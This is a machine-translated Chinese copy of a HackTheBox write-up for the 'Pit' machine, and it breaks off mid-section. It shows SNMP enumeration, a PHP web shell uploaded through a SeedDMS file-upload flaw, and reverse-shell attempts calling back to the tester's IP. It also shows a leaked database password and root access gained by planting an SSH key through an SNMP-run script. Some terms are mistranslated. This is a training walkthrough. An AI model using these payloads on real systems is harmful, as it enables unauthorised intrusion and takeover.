

udp扫描
# 0xdf黑客的东西

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/09/25/htb-pit.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpit-cover.) 

皮特以两种不同的方式使用SNMP。首先，我将枚举它以泄漏运行SeedDMS的Web服务器的位置，在该位置，我将滥用网络外壳上传漏洞以在主机上获取RCE。由于SeLinux，我无法获得反向外壳，但我可以枚举足够的内容来查找michelle的密码，并使用它来访问提供终端的驾驶舱实例。从那里，我会发现我可以编写将由SNMP运行的脚本，我将使用它来获取执行和shell作为root。在《超越根》中，我们来看看塞利努克斯，以及它如何阻止了我试图在 Pit 上做的事情。

## 箱子信息

名字

[坑](https://www.hackthebox.eu/home/machines/profile/346) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-pit.png) 

发行日期

[15 五月 2021](https://twitter.com/hackthebox_eu/status/1392494135421120516)

停用日期

25 9月 2021

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpit-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpit-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

01 小时 35 分 18 秒[![断续器](https://image.cubox.pro/article/2022091910535330943/81373.jpg)](https://www.hackthebox.eu/home/users/profile/77141)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

02小时，00分钟，33秒[![断续器](https://image.cubox.pro/article/2022091910535330943/81373.jpg)](https://www.hackthebox.eu/home/users/profile/77141)

创造者

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F159204)](https://www.hackthebox.eu/home/users/profile/159204)-
[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F125033)](https://www.hackthebox.eu/home/users/profile/125033)-

## 侦察

### n地图

`nmap`找到三个开放的 TCP 端口，即固态混合端口 （22）、HTTP （80） 和 HTTPS （9090）：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.241
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 09:35 EDT
    Nmap scan report for 10.10.10.241
    Host is up (0.10s latency).
    Not shown: 65532 filtered ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    9090/tcp open  zeus-admin
    
    Nmap done: 1 IP address (1 host up) scanned in 25.01 seconds
    oxdf@parrot$ nmap -p 22,80,9090 -sCV -oA scans/nmap-tcpscripts 10.10.10.241
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 09:41 EDT
    Nmap scan report for 10.10.10.241
    Host is up (0.089s latency).
    PORT     STATE SERVICE         VERSION
    22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
    | ssh-hostkey:
    |   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)                  
    |   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
    |_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
    80/tcp   open  http            nginx 1.14.1
    |_http-server-header: nginx/1.14.1
    |_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
    9090/tcp open  ssl/zeus-admin?
    | fingerprint-strings:
    |   GetRequest, HTTPOptions:
    |     HTTP/1.1 400 Bad request
    |     Content-Type: text/html; charset=utf8
    |     Transfer-Encoding: chunked
    |     X-DNS-Prefetch-Control: off
    |     Referrer-Policy: no-referrer
    |     X-Content-Type-Options: nosniff
    |     Cross-Origin-Resource-Policy: same-origin                           
    |     <!DOCTYPE html>
    |     <html>
    |     <head>
    |     <title>
    |     request
    |     </title>
    |     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    |     <meta name="viewport" content="width=device-width, initial-scale=1.0">
    |     <style>
    |     body {
    |     margin: 0;
    |     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
    |     font-size: 12px;
    |     line-height: 1.66666667;
    |     color: #333333;
    |     background-color: #f5f5f5;
    |     border: 0;
    |     vertical-align: middle;
    |     font-weight: 300;
    |_    margin: 0 0 10p
    | ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
    | Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
    | Not valid before: 2020-04-16T23:29:12
    |_Not valid after:  2030-06-04T16:09:12
    |_ssl-date: TLS randomness does not represent time                          
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port9090-TCP:V=7.91%T=SSL%I=7%D=5/14%Time=609E7E56%P=x86_64-pc-linux-gn
    ...[SNIP]...
    

9090 上的服务具有名称为 dms-pit.htb 的证书，因此我将将其添加到 中。`/etc/hosts`

完成TCP扫描后，我通常会在后台运行UDP扫描，但很少显示它，因为它通常不会显示任何有趣的东西（或者根本没有任何东西）。UDP超级挑剔。我喜欢的一个技巧是在扫描时运行脚本和/或检查版本，因为如果有结果，这是一个比端口更好的指标。在这里，它确实在UDP 161上找到了SNMP：`nmap``open|filtered`

    oxdf@parrot$ sudo nmap -sU --top-ports 10 -sV 10.10.10.241
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 11:01 EDT
    Nmap scan report for 10.10.10.241
    Host is up (0.090s latency).
    
    PORT     STATE    SERVICE      VERSION
    53/udp   filtered domain
    67/udp   filtered dhcps
    123/udp  filtered ntp
    135/udp  filtered msrpc
    137/udp  filtered netbios-ns
    138/udp  filtered netbios-dgm
    161/udp  open     snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
    445/udp  filtered microsoft-ds
    631/udp  filtered ipp
    1434/udp filtered ms-sql-m
    Service Info: Host: pit.htb
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 5.11 seconds
    
    

### 网站 - TCP 80

按 IP 地址访问站点将返回默认的红帽 NGINX 页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514111324095.png) 

`feroxbuster`在此IP上找不到任何内容。

来访返回 403：`http://dms-pit.htb`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514111425727.png) 

`feroxbuster`在这个URL上找到很多东西，但它都是403：

    oxdf@parrot$ feroxbuster -u http://dms-pit.htb
    
     ___  ___  __   __     __      __         __   ___                  
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__             
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                 
    by Ben "epi" Risher 🤓                 ver: 2.2.1              
    ───────────────────────────┬──────────────────────                
     🎯  Target Url            │ http://dms-pit.htb                  
     🚀  Threads               │ 50                                                            
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7                                                             
     🦡  User-Agent            │ feroxbuster/2.2.1                 
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔃  Recursion Depth       │ 4                                                             
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────           
     🏁  Press [ENTER] to use the Scan Cancel Menu™                
    ──────────────────────────────────────────────────                  
    403        7l       10w      169c http://dms-pit.htb/Conferences
    403        7l       10w      169c http://dms-pit.htb/configurator
    403        7l       10w      169c http://dms-pit.htb/autoconfig  
    403        7l       10w      169c http://dms-pit.htb/disappearing
    ...[snip]...
    403        7l       10w      169c http://dms-pit.htb/confridin
    403        7l       10w      169c http://dms-pit.htb/webconfig
    [####################] - 59s    29999/29999   0s      found:74      errors:0      
    [####################] - 59s    29999/29999   506/s   http://dms-pit.htb
    

### HTTPS - TCP 9090

通过 IP 或 dms-pit.htb 访问此页面会得到相同的页面，即 CentOS Linux 远程访问页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514112303071.png) 

有趣的是，还有另一个域，.将其添加到 后，我检查了这个端口和端口80，但没有什么新东西。`pit.htb``/etc/hosts`

### 美国军用计价器 - UDP 161

若要枚举 SNMP，需要一个社区字符串。默认情况下，始终值得尝试“公开”。我将整个SNMP转储到一个文件中进行查看（我也已经安装了mibs - 有关详细信息[，请参阅Seby](https://0xdf.gitlab.io/2021/03/02/htb-sneaky.html#snmp---udp-161)）：`snmp-walk`

    oxdf@parrot$ snmpwalk -v1 -c public 10.10.10.241 . > scans/snmpwalk-full
    oxdf@parrot$ wc -l scans/snmpwalk-full
    1639 scans/snmpwalk-full
    

看看数据，有一些东西跳了出来。

主机名为 ：`pit.htb`

    SNMPv2-MIB::sysName.0 = STRING: pit.htb
    

我得到了一个完整的流程列表，虽然有一些不熟悉的应用程序，但在这一点上没有什么有趣的东西。当我到达带有该过程的输出行的部分时，在：`monitoring``NET-SNMP-EXTEND-MIB`

    NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
                  total        used        free      shared  buff/cache   available
    Mem:          3.8Gi       343Mi       3.2Gi       8.0Mi       295Mi       3.3Gi
    Swap:         1.9Gi          0B       1.9Gi
    Database status
    OK - Connection to database successful.
    System release info
    CentOS Linux release 8.3.2011
    SELinux Settings
    user
    
                    Labeling   MLS/       MLS/                          
    SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
    
    guest_u         user       s0         s0                             guest_r
    root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
    staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
    sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
    system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
    unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
    user_u          user       s0         s0                             user_r
    xguest_u        user       s0         s0                             xguest_r
    login
    
    Login Name           SELinux User         MLS/MCS Range        Service
    
    __default__          unconfined_u         s0-s0:c0.c1023       *
    michelle             user_u               s0                   *
    root                 unconfined_u         s0-s0:c0.c1023       *
    System uptime
     11:42:32 up  2:09,  0 users,  load average: 0.00, 0.00, 0.00
    

操作系统版本是 CentOS Linux 8.3.2011。它正在运行SELinux，有一个名叫米歇尔的用户。

还有另一行跳了出来：

    UCD-SNMP-MIB::dskPath.1 = STRING: /
    UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms
    UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root
    UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms  
    

我目前还不清楚这是什么。但它是目录中的路径，这表明它可能是 Web 服务器上的路径。`/var/www/html`

### 种子DMS

#### 网站

访问重定向到登录页面：`http://dms-pit.htb/seeddms51x/seeddms/`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514122210250.png) 

它声称是一个机密区域。种子DMS是一个免费的文档管理系统。

#### 登录

在这一点上，我确实有一个用户名，米歇尔。经过几次猜测，密码米歇尔提供了访问权限：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514122627690.png) 

“升级说明”很有趣：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514122741537.png) 

由于 5.1.10 中的安全问题，它们升级到了 5.1.15。

我还将注意到此应用程序中的 url 以 结尾。`.php`

## 谢尔 饰 米歇尔

### 识别漏洞利用

查看版本5.1.11的更新日志，最重要的问题是：

> *   修复 CVE-2019-12744（通过未经验证的文件上传远程执行命令），将 .htaccess 文件添加到数据目录，用于安装 seeddms 的更好文档

这听起来像是旧版本允许上传PHP网络外壳。令人惊讶的是修复程序 - “添加文件”。这可能适用于阿帕奇，但不适用于此服务器正在运行的[NGINX](https://stackoverflow.com/questions/35766676/how-can-i-use-an-htaccess-file-in-nginx)。`.htaccess`

漏洞利用数据库上有一个用于此漏洞利用的公共 [POC](https://www.exploit-db.com/exploits/47022)。基本上，它说上传一个网络外壳，然后在中找到它，其中文档ID在上传后在文件页面中可用。`/data/1048576/"document_id"/1.php`

通过将鼠标悬停在文件的链接上，我可以看到它document\_id是21：`CHANGELOG`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514125346587.png) 

我对文件结构进行了一些猜测，看看我是否可以找到新文件，并最终在以下位置找到它：`.htaccess``/data``http://dms-pit.htb/seeddms51x/data/.htaccess`

    # line below if for Apache 2.4
    <ifModule mod_authz_core.c>
    Require all denied
    </ifModule>
    
    # line below if for Apache 2.2
    <ifModule !mod_authz_core.c>
    deny from all
    Satisfy All
    </ifModule>
    
    # section for Apache 2.2 and 2.4
    <ifModule mod_autoindex.c>
    IndexIgnore *
    </ifModule>
    

在 Apache 上，这将阻止访问 中的任何文件。但同样，这是NGINX。`/data`

### 网络外壳

看起来我无权上传到根目录，但我会开始在文件夹中挖掘。一旦我到达，有两个目录，米歇尔和杰克：`/Docs/Users/`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514125936310.png) 

基于图标没有灰显，我可能对米歇尔有一些权限。

单击该按钮，顶部没有一堆选项，包括添加文档：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514130024685.png) 

我会上传我最喜欢的简单PHP网络外壳：

    <?php system($_REQUEST["cmd"]); ?>
    

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514130144165.png) 

文档 ID 为 31。

    oxdf@parrot$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php?cmd=id
    uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
    

这就是代码执行！此文件每5-10分钟删除一次，因此我可能需要再次上传，并且文档ID也将增加。

### 反向外壳故障

我尝试了一堆东西来获得反向外壳，但它们都失败了。当我甚至无法连接到我的主机时，我猜可能是防火墙，但它仍然表现得很奇怪。`curl`

    oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=curl http://10.10.14.7 2>&1'
    

查看与我的连接，它也失败了：`nc`

    oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=nc 10.10.14.7 443 2>&1'
    Ncat: Permission denied.
    

权限被拒绝很有趣。我将查看该文件：

    oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /bin/nc'
    lrwxrwxrwx. 1 root root 22 May 10 10:56 /bin/nc -> /etc/alternatives/nmap
    oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /etc/alternatives/nmap'
    lrwxrwxrwx. 1 root root 13 May 10 10:56 /etc/alternatives/nmap -> /usr/bin/ncat
    oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /usr/bin/ncat'
    -rwxr-xr-x. 1 root root 644376 Nov  8  2019 /usr/bin/ncat
    

忽略链接以某种方式通过[替代方案](https://0xdf.gitlab.io/2020/03/25/update-alternatives.html)配置的事实，实际的二进制文件在权限的末尾有一个额外的内容。这表明 [SELinux 正在影响该文件](https://serverfault.com/questions/778407/linux-file-permission-got-a-ending-dot-and-webserver-denied-access)。`nc``ncat``.`

`curl`也有它：

    oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /usr/bin/curl'
    -rwxr-xr-x. 1 root root 244104 Dec 17 17:46 /usr/bin/curl
    

### 网络外壳枚举

我将使用一个简单的 Bash 循环来枚举通过网络外壳的框：

    oxdf@parrot$ while :; do read -p "> " cmd; curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode "cmd=$cmd 2>&1"; done
    > id
    uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
    > ls
    1.php
    > nc 10.10.14.7 443
    Ncat: Permission denied.
    

我无法访问 ：`/home`

    > ls /home
    ls: cannot open directory '/home': Permission denied
    

查看网络目录，有一个用于DMS的目录：`settings.xml`

    > ls ../..
    1048576
    backup
    cache
    conf
    log
    lucene
    staging
    > ls ../../conf
    settings.xml
    settings.xml.template
    stopwords.txt
    

在内部，这条线有信誉：

    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
    

### 远程外壳

该密码不适用于米歇尔的SSH：

    oxdf@parrot$ sshpass -p "ied^ieY6xoquu" ssh michelle@10.10.10.241
    Warning: Permanently added '10.10.10.241' (ECDSA) to the list of known hosts.
    michelle@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
    

看起来需要基于密钥的身份验证。但它将通过TCP 9090上的服务以米歇尔的身份登录：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514140829578.png) 

左侧的底部选项是终端：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210514141634210.png) 

有时 shell 中的文本都是乱码：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210923143425844.png) 

更改外观一到两次将解决此问题。我也可以用.`Ctrl-Insert`

我可以抓住 ：`user.txt`

    [michelle@pit ~]$ cat user.txt
    78455c9b************************
    

## 外壳作为根

### 列举

作为米歇尔，我只能看到米歇尔拥有的流程：

    [michelle@pit .ssh]$ ps auxww
    USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root           1  0.0  0.3 245460 14256 ?        Ss   09:32   0:06 /usr/lib/systemd/systemd --switched-root --system --deserialize 17
    michelle    4334  0.0  0.0  27400   516 ?        Ss   13:44   0:00 /usr/bin/ssh-agent
    michelle    4337  0.0  0.2  94016  9996 ?        Ss   13:44   0:00 /usr/lib/systemd/systemd --user
    michelle    4341  0.0  0.1 314728  5124 ?        S    13:44   0:00 (sd-pam)
    michelle    4347  0.1  0.8 425048 32716 ?        Rl   13:44   0:05 cockpit-bridge
    michelle    5939  0.0  0.0  24096  3932 pts/0    Ss   14:10   0:00 /bin/bash
    michelle    7105  0.0  0.0  58692  4024 pts/0    R+   14:32   0:00 ps auxww
    

但是我有SNMP访问权限，它提供了完整的进程列表。有趣的是 .对此进行一些挖掘表明，它是一个允许运行由SNMP触发[的特定脚本的](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)扩展。还给出了命令：`NET-SNMP-EXTEND-MIB`

    NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
    

`monitor`不显示与 一起，但它位于：`which``/usr/bin`

    [michelle@pit /]$ which monitor
    /usr/bin/which: no monitor in (/home/michelle/.local/bin:/home/michelle/bin:/home/michelle/.local/bin:/home/michelle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)
    [michelle@pit /]$ find . -name monitor -ls 2>/dev/null
       517764      4 -rw-r--r--   1  root     root         3252 Jan  4 11:28 ./usr/share/snmp/snmpconf-data/snmpd-data/monitor
       797223      4 -rwxr--r--   1  root     root           88 Apr 18  2020 ./usr/bin/monitor
    

只有root可以运行它，这就是为什么不识别它的原因。`which`

脚本本身只是一个 Bash 脚本，用于查找脚本并运行它们：`/usr/local/monitoring`

    [michelle@pit /]$ file /usr/bin/monitor 
    /usr/bin/monitor: Bourne-Again shell script, ASCII text executable
    [michelle@pit /]$ cat /usr/bin/monitor
    #!/bin/bash
    
    for script in /usr/local/monitoring/check*sh
    do
        /bin/bash $script
    done
    

我无法在该目录中读取，并且目录本身只能通过root写入：

    [michelle@pit /]$ ls -l /usr/local/monitoring
    ls: cannot open directory '/usr/local/monitoring': Permission denied
    [michelle@pit /]$ ls -ld /usr/local/monitoring
    drwxrwx---+ 2 root root 122 May 14 14:40 /usr/local/monitoring
    

但是，权限的末尾有 一个，这意味着在目录上设置了其他 ACL。米歇尔实际上可以从目录中编写和执行：`+`

    [michelle@pit /]$ getfacl /usr/local/monitoring
    getfacl: Removing leading '/' from absolute path names
    # file: usr/local/monitoring
    # owner: root
    # group: root
    user::rwx
    user:michelle:-wx
    group::rwx
    mask::rwx
    other::---
    

### 以根身份执行

我将向我的 VM 编写一个简单的脚本：`ping`

    [michelle@pit monitoring]$ echo 'ping -c 1 10.10.14.7' > check_0xdf.sh
    [michelle@pit monitoring]$ cat check_0xdf.sh
    ping -c 1 10.10.14.7
    

该脚本以米歇尔的身份工作正常：

    [michelle@pit monitoring]$ bash check_0xdf.sh
    PING 10.10.14.7 (10.10.14.7) 56(84) bytes of data.
    64 bytes from 10.10.14.7: icmp_seq=1 ttl=63 time=92.3 ms
    
    --- 10.10.14.7 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 92.259/92.259/92.259/0.000 ms
    

现在，我将通过 SNMP 触发它（我可以只触发监视脚本的 MIB，这样它就不需要几分钟就能运行）：

    oxdf@parrot$ snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
    NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1             
    NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
    NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING:
    NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING:
    NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
    NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
    NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
    NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
    NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: ping: cap_set_proc: Permission denied                                                    
    NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: ping: cap_set_proc: Permission denied                                                     
    Memory usage
                  total        used        free      shared  buff/cache   available
    Mem:          3.8Gi       439Mi       3.0Gi       8.0Mi       393Mi       3.2Gi
    Swap:         1.9Gi          0B       1.9Gi
    ...[snip]...
    

有某种权限被拒绝（最后两行以 开头），这很奇怪，但感觉像SELinux。它确实显示它尝试运行脚本。`ping``NET-SNMP`

### 壳

我将尝试一个脚本，该脚本将SSH密钥写入根的文件：`authorized_keys`

    [michelle@pit monitoring]$ echo 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" | tee /root/.ssh/authorized_keys && echo "it worked!"' > check_0xdf.sh
    

我使用和附加，以便输出将在SNMP输出中可见，以查看它是否有效。`tee``echo`

触发该操作时，输出看起来不错：

    oxdf@parrot$ snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
    NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
    NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor   
    NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING:           
    NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING:      
    NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
    NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
    NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
    NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
    NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
    NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
    it worked!
    Memory usage
                  total        used        free      shared  buff/cache   available
    Mem:          3.8Gi       449Mi       3.0Gi       8.0Mi       394Mi       3.2Gi 
    ...[snip]...
    

SSH将以根身份使用匹配的私钥进行连接：

    oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.241
    Web console: https://pit.htb:9090/ or https://10.10.10.241:9090/
    
    Last login: Mon May 10 11:42:46 2021
    [root@pit ~]# 
    

然后拿起那面旗帜：

    [root@pit ~]# cat root.txt
    a96b3445************************
    

## 超越根 - 塞利努克斯

### 背景

在解决过程中，我注意到 SeLinux 在盒子上，并阻止了我试图做的事情。SeLinux 不仅围绕文件访问，还围绕其他类型的访问（如套接字）提供了大量更精细的权限。它阻挡了网壳的反向外壳。它还阻止我使用 SNMP 脚本访问 。例如，创建以下脚本：`root.txt`

    [michelle@pit monitoring]$ echo "echo "root flag:"; cat /root/root.txt" > check_root.sh
    

运行它会产生以下两行：

    NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: root flag:
    NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: cat: /root/root.txt: Permission denied 
    

查看该文件，它在权限的末尾指示 SeLinux：`.`

    [root@pit monitoring]# ls -l /root/root.txt 
    -r--------. 1 root root 33 Sep 23 14:07 /root/root.txt
    

使用 with 将显示塞林克斯上下文：`-Z``ls`

    [root@pit ~]# ls -Z root.txt 
    unconfined_u:object_r:admin_home_t:s0 root.txt
    

所以属于这个角色。`root.txt``admin_home_t`

### 根.txt

SeLinux 可以在两种模式下运行 - 强制 （1） 和允许 （0）。 将返回正在运行的模式：`getenforce`

    [root@pit monitoring]# getenforce 
    Enforcing
    

强制实施将阻止特定活动，其中Permisive将仅记录它们，但让它们发生。

例如，如果我更改模式：

    [root@pit monitoring]# setenforce permissive
    

然后重新触发 SNMP 脚本以获取根标志：

    NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: root flag:
    NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: 452a9b73************************ 
    

日志在 创建位置。当我尝试使用 SNMP 读取并被阻止时，创建了以下日志：`/var/log/audit/audit.log``root.txt`

    type=AVC msg=audit(1632502921.588:5222): avc:  denied  { read } for  pid=14471 comm="cat" name="root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=0
    

在许可模式下，创建了三个日志：

    type=AVC msg=audit(1632502973.982:5226): avc:  denied  { read } for  pid=14524 comm="cat" name="root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
    type=AVC msg=audit(1632502973.982:5226): avc:  denied  { open } for  pid=14524 comm="cat" path="/root/root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
    type=AVC msg=audit(1632502973.982:5227): avc:  denied  { getattr } for  pid=14524 comm="cat" path="/root/root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
    

第一个日志与上一个日志完全相同，只是而不是 0。这两个都是为了系统调用。在许可模式下接下来的两个登录是用于 和 on 。`permissive=1``read``open``getattr``root.txt`

在所有日志中，我可以看到问题出在尝试访问的角色上。如果我通过管道将该日志插入 ，它显示了如何使系统不阻止它：`snmpd_t``admin_home_t``audit2allow`

    [root@pit audit]# cat audit.log | grep read | grep root.txt | tail -1 | audit2allow 
    
    #============= snmpd_t ==============
    allow snmpd_t admin_home_t:file read;
    

在这种情况下，需要访问 。`snmpd_t``file read``admin_home_t`

### 网络外壳

来自网络外壳的反壳是另一个被阻挡的东西。事实上，与我的任何联系都被封锁了。为了演示，我将运行网络外壳以仅连接到我的主机：`nc`

